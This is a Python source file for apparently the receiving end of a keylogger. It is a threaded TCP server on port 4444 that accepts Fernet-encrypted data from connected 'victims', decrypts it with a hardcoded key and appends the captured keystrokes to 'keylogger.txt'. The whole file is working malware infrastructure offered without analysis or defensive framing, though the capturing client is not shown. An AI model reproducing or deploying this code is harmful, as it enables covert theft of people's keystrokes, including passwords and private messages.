import socket
import threading
import sys
import os
# Implement fernet 
from cryptography.fernet import Fernet, InvalidToken


class Server():

   def __init__(self, Host, Port):
    
     self.__Host = Host
     self.__Port = Port

   def handle_client(self, conn, addr):

      print(f"Connected from {addr[0]}:{addr[1]}")

      try: 
            while True:

               data = conn.recv(1024)

               if not data:

                  print(f"Client {addr[0]} has disconnected")
                  break 

               try: 
                     # decode_msg = data.decode('utf-8')
                     print(f'Raw data: {data}')
                     decode_msg = crypt.decrypt(data).decode('utf-8')
                     print(f"{decode_msg}", end='')

                     with open("keylogger.txt", 'a') as f:

                        f.write(decode_msg)

               except InvalidToken:
                     
                     print(f"Invalid Token from {addr[0]}")
                     continue

      except ConnectionResetError:

         print(f"The victim has disconnected")

      finally:

         conn.close()
         
   def start_server(self):
     
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         Adress = (self.__Host, self.__Port)
         s.bind(Adress)
         s.listen()
         print(f"Server is listening on {self.__Host}:{self.__Port}")
         print("Listening for connection...")

         try:

            while True:

               conn, addr = s.accept()

               handle_client = threading.Thread(target=self.handle_client, args=(conn,addr))
               handle_client.start()
            
         except KeyboardInterrupt:

            print("Server is shutting down, due to KeyboardInterruption")
         
         finally: 
            
            s.close()
            print("Socket has been closed.")
            sys.exit(0)
if __name__ == '__main__':
  
   Host = "0.0.0.0"
   Port = 4444

   # load the key

   KEY = b"GLpnLBTkUsqcwT5TYpMgQT0c-W_Ust13ybM3ZK5whj8="
   crypt = Fernet(KEY)

   server = Server(Host, Port)

   server.start_server()
  

